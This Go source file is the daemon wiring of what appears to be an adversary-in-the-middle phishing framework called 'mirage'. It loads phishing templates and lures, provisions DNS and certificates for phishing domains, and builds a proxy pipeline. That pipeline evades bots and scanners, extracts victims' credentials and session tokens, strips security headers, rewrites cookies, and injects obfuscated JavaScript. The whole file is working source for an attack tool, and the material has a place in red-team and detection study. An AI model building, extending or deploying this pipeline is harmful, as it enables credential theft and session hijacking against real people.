package daemon

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/api"
	"github.com/travisbale/mirage/internal/botguard"
	"github.com/travisbale/mirage/internal/cert"
	"github.com/travisbale/mirage/internal/config"
	"github.com/travisbale/mirage/internal/dns"
	"github.com/travisbale/mirage/internal/events"
	"github.com/travisbale/mirage/internal/obfuscator"
	"github.com/travisbale/mirage/internal/phishlet"
	"github.com/travisbale/mirage/internal/proxy"
	"github.com/travisbale/mirage/internal/proxy/handlers/request"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
	"github.com/travisbale/mirage/internal/store/sqlite"
)

type scriptObfuscator interface {
	Obfuscate(ctx context.Context, html []byte) ([]byte, error)
	Shutdown(ctx context.Context) error
}

// Daemon is the fully-wired daemon. One instance per process.
type Daemon struct {
	configPath string
	logger     *slog.Logger

	cfg *config.Config

	// Infrastructure.
	db                *sqlite.DB
	bus               *events.Bus
	dnsService        *aitm.DNSService
	watcher           *phishlet.Watcher
	phishletReloadSub <-chan aitm.Event

	// Proxy.
	proxy *proxy.AITMProxy

	// JS obfuscator — always non-nil after New (no-op when disabled).
	obfuscator scriptObfuscator

	// Services needed by health check and reload.
	phishletStore *sqlite.Phishlets
	sessionSvc    *aitm.SessionService
}

// initializer carries transient build-time state
type initializer struct {
	*Daemon

	lureStore       *sqlite.Lures
	resolver        *aitm.PhishletResolver
	activeHostnames *proxy.ActiveHostnameSet
	activeCount     int
	zones           map[string]aitm.ZoneConfig
	certSource      *cert.SelfSignedCertSource
	botStore        *sqlite.Bots
	botGuardSvc     *aitm.BotGuardService
	sessionStore    aitm.SessionStore
	lureSvc         *aitm.LureService
	blacklistSvc    *aitm.BlacklistService
	spoofProxy      *proxy.SpoofProxy
	wsHub           *proxy.WSHub
}

// New constructs and fully wires a Daemon. Returns an error if any
// subsystem fails to initialise — no partial startup.
func New(ctx context.Context, configPath string, developer bool, version string, logger *slog.Logger) (*Daemon, error) {
	cfg, err := loadConfig(configPath)
	if err != nil {
		return nil, err
	}

	ini := &initializer{
		Daemon: &Daemon{
			configPath: configPath,
			logger:     logger,
			cfg:        cfg,
			bus:        events.NewBus(events.DefaultBufferSize),
		},
	}

	if err := ini.initStore(); err != nil {
		return nil, err
	}
	if err := ini.initPhishlets(); err != nil {
		return nil, err
	}
	if err := ini.initDNS(); err != nil {
		return nil, err
	}
	if err := ini.initCerts(developer); err != nil {
		return nil, err
	}
	if err := ini.initServices(); err != nil {
		return nil, err
	}
	if err := ini.initProxy(version); err != nil {
		return nil, err
	}

	ini.initWatcher()

	logger.Info("miraged ready",
		"version", version,
		"domain", cfg.Domain,
		"https_port", cfg.HTTPSPort,
		"api_hostname", cfg.API.SecretHostname,
		"active_phishlets", ini.activeCount,
	)

	return ini.Daemon, nil
}

func (ini *initializer) initStore() error {
	db, err := sqlite.Open(ini.cfg.DBPath)
	if err != nil {
		return fmt.Errorf("opening database: %w", err)
	}
	ini.db = db

	return nil
}

func (ini *initializer) initPhishlets() error {
	ini.phishletStore = sqlite.NewPhishletStore(ini.db)
	ini.lureStore = sqlite.NewLureStore(ini.db)
	ini.resolver = aitm.NewPhishletResolver(ini.phishletStore, ini.lureStore)
	ini.activeHostnames = &proxy.ActiveHostnameSet{}

	ini.loadPhishletDefs(ini.cfg.PhishletsDir, ini.resolver)

	activeCount, zones, err := ini.populateActivePhishlets(ini.cfg.ExternalIPv4, ini.activeHostnames)
	if err != nil {
		return err
	}

	ini.activeCount = activeCount
	ini.zones = zones

	return nil
}

func (ini *initializer) initDNS() error {
	providers, err := dns.BuildProviders(ini.cfg.DNSProviders, ini.cfg.ExternalIPv4, ini.cfg.DNSPort)
	if err != nil {
		return fmt.Errorf("initializing DNS providers: %w", err)
	}
	ini.dnsService = aitm.NewDNSService(providers, ini.zones, ini.bus)

	return nil
}

func (ini *initializer) initCerts(developer bool) error {
	caDir := filepath.Join(filepath.Dir(ini.cfg.DBPath), "ca")

	src, err := cert.NewSource(developer, caDir, ini.logger)
	if err != nil {
		return err
	}
	ini.certSource = src

	return nil
}

func (ini *initializer) initServices() error {
	ini.botStore = sqlite.NewBotStore(ini.db)
	ini.botGuardSvc = &aitm.BotGuardService{
		Scorer: &botguard.Scorer{
			Config: botguard.BotGuardConfig{
				Enabled:            true,
				TelemetryThreshold: 0.6,
			},
			SignatureFinder: ini.botStore,
			Logger:          ini.logger,
		},
		Store: ini.botStore,
		Bus:   ini.bus,
	}

	ini.sessionStore = sqlite.NewSessionStore(ini.db)
	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
	ini.lureSvc = &aitm.LureService{Store: ini.lureStore}
	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
	ini.spoofProxy = proxy.NewSpoofProxy("")
	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)

	return nil
}

func (ini *initializer) initProxy(version string) error {
	apiHandler := api.NewRouter(api.RouterDeps{
		Sessions:  ini.sessionSvc,
		Lures:     ini.lureSvc,
		Phishlets: ini.phishletStore,
		Blacklist: ini.blacklistSvc,
		Botguard:  ini.botStore,
		Bus:       ini.bus,
		Domain:    ini.cfg.Domain,
		Version:   version,
		Logger:    ini.logger,
	})

	ini.obfuscator = &obfuscator.NoOpObfuscator{}
	if ini.cfg.Obfuscator.Enabled {
		nodeObfuscator, err := obfuscator.NewNodeObfuscator(ini.cfg.Obfuscator, ini.logger)
		if err != nil {
			ini.logger.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
		} else {
			ini.obfuscator = nodeObfuscator
		}
	}

	pipeline := buildPipeline(pipelineDeps{
		botGuardSvc:      ini.botGuardSvc,
		blacklistSvc:     ini.blacklistSvc,
		sessionSvc:       ini.sessionSvc,
		sessionStore:     ini.sessionStore,
		phishletResolver: ini.resolver,
		activeHostnames:  ini.activeHostnames,
		spoofProxy:       ini.spoofProxy,
		bus:              ini.bus,
		apiHandler:       apiHandler,
		apiHostname:      ini.cfg.API.SecretHostname,
		obfuscator:       ini.obfuscator,
	}, ini.logger)

	aitmProxy := &proxy.AITMProxy{
		CertSource: ini.certSource,
		Pipeline:   pipeline,
		WSHub:      ini.wsHub,
		Spoof:      ini.spoofProxy,
		Logger:     ini.logger,
	}

	clientCA, err := loadOrGenerateCA(ini.cfg.API.ClientCACertPath, ini.logger)
	if err != nil {
		return err
	}
	if err := issueOperatorCert(clientCA, ini.cfg.API.ClientCACertPath, ini.logger); err != nil {
		return err
	}
	aitmProxy.SecretHostname = ini.cfg.API.SecretHostname
	aitmProxy.ClientCAs = clientCA.CertPool()
	ini.logger.Info("API enabled", "hostname", ini.cfg.API.SecretHostname, "ca_cert", ini.cfg.API.ClientCACertPath)

	ini.proxy = aitmProxy

	return nil
}

func (ini *initializer) initWatcher() {
	var err error
	ini.watcher, err = phishlet.NewWatcher(ini.cfg.PhishletsDir, ini.bus)
	if err != nil {
		ini.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
		return
	}
	ini.phishletReloadSub = events.SubscribeFunc(ini.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
		if def, ok := ev.Payload.(*aitm.PhishletDef); ok {
			ini.resolver.RegisterDef(def)
		}
	})
	ini.watcher.Start()
}

func (d *Daemon) populateActivePhishlets(externalIP string, activeHostnames *proxy.ActiveHostnameSet) (int, map[string]aitm.ZoneConfig, error) {
	configs, err := d.phishletStore.ListPhishletConfigs()
	if err != nil {
		return 0, nil, fmt.Errorf("listing phishlet configs: %w", err)
	}
	zones := make(map[string]aitm.ZoneConfig)
	activeCount := 0
	for _, pcfg := range configs {
		if !pcfg.Enabled {
			continue
		}
		activeCount++
		if pcfg.Hostname != "" {
			activeHostnames.Add(pcfg.Hostname)
		}
		if pcfg.BaseDomain != "" && pcfg.DNSProvider != "" {
			zones[pcfg.BaseDomain] = aitm.ZoneConfig{
				Zone:         pcfg.BaseDomain,
				ProviderName: pcfg.DNSProvider,
				ExternalIP:   externalIP,
			}
		}
	}
	return activeCount, zones, nil
}

func (d *Daemon) loadPhishletDefs(dir string, resolver *aitm.PhishletResolver) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		d.logger.Warn("could not read phishlets directory", "dir", dir, "error", err)
		return
	}

	loader := &phishlet.Loader{}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		name := strings.ToLower(entry.Name())
		if !strings.HasSuffix(name, ".yaml") && !strings.HasSuffix(name, ".yml") {
			continue
		}

		path := filepath.Join(dir, entry.Name())
		def, err := loader.Load(path)
		if err != nil {
			d.logger.Warn("failed to load phishlet", "path", path, "error", err)
			continue
		}

		resolver.RegisterDef(def)
		d.logger.Info("loaded phishlet", "name", def.Name)
	}
}

func loadConfig(path string) (*config.Config, error) {
	cfg, err := config.Load(path)
	if err != nil {
		return nil, fmt.Errorf("loading config: %w", err)
	}

	if err := cfg.Validate(); err != nil {
		return nil, fmt.Errorf("invalid config: %w", err)
	}

	return cfg, nil
}

func issueOperatorCert(ca *api.CA, caCertPath string, logger *slog.Logger) error {
	dir := filepath.Dir(caCertPath)
	certPath := filepath.Join(dir, "operator.crt")
	keyPath := filepath.Join(dir, "operator.key")

	if _, err := os.Stat(certPath); err == nil {
		return nil
	}

	certPEM, keyPEM, err := ca.IssueClientCert("operator")
	if err != nil {
		return fmt.Errorf("issuing operator client cert: %w", err)
	}

	if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
		return fmt.Errorf("writing operator cert: %w", err)
	}

	if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
		return fmt.Errorf("writing operator key: %w", err)
	}

	logger.Info("issued operator client certificate", "cert", certPath, "key", keyPath)

	return nil
}

func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
			return nil, fmt.Errorf("creating CA directory: %w", err)
		}

		ca, err := api.GenerateCA(certPath)
		if err != nil {
			return nil, fmt.Errorf("generating API CA: %w", err)
		}

		logger.Info("generated API client CA", "cert", certPath)

		return ca, nil
	}

	return api.Load(certPath)
}

type pipelineDeps struct {
	botGuardSvc      *aitm.BotGuardService
	blacklistSvc     *aitm.BlacklistService
	sessionSvc       *aitm.SessionService
	sessionStore     aitm.SessionStore
	phishletResolver *aitm.PhishletResolver
	activeHostnames  *proxy.ActiveHostnameSet
	spoofProxy       *proxy.SpoofProxy
	bus              aitm.EventBus
	apiHandler       *api.Router
	apiHostname      string
	obfuscator       scriptObfuscator
}

func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
	return &proxy.Pipeline{
		RequestHandlers: []proxy.RequestHandler{
			&request.JA4Extractor{},
			&request.BotGuardCheck{
				Service: d.botGuardSvc,
				Spoof:   d.spoofProxy,
			},
			&request.IPExtractor{},
			&request.BlacklistChecker{
				Service: d.blacklistSvc,
				Spoof:   d.spoofProxy,
			},
			&request.APIRouter{
				SecretHostname: d.apiHostname,
				Handler:        d.apiHandler,
			},
			&request.PhishletRouter{
				ActiveHostnameSet: d.activeHostnames,
				Resolver:          d.phishletResolver,
				Spoof:             d.spoofProxy,
			},
			&request.LureValidator{
				Spoof: d.spoofProxy,
			},
			&request.SessionResolver{
				Store:   d.sessionStore,
				Factory: d.sessionSvc,
			},
			&request.TelemetryScoreCheck{
				Scorer:    d.botGuardSvc,
				Spoof:     d.spoofProxy,
				Threshold: 0.6,
			},
			&request.URLRewriter{},
			&request.CredentialExtractor{
				Store:  d.sessionStore,
				Bus:    d.bus,
				Logger: logger,
			},
			&request.ForcePostInjector{},
		},
		ResponseHandlers: []proxy.ResponseHandler{
			&response.SecurityHeaderStripper{},
			&response.CookieRewriter{},
			&response.SubFilterApplier{},
			&response.TokenExtractor{
				Store:     d.sessionStore,
				Bus:       d.bus,
				Completer: d.sessionSvc,
				Whitelist: d.blacklistSvc,
				Logger:    logger,
			},
			&response.JSInjector{},
			&response.JSObfuscator{
				Obfuscator: d.obfuscator,
				Logger:     logger,
			},
		},
		Logger: logger,
	}
}
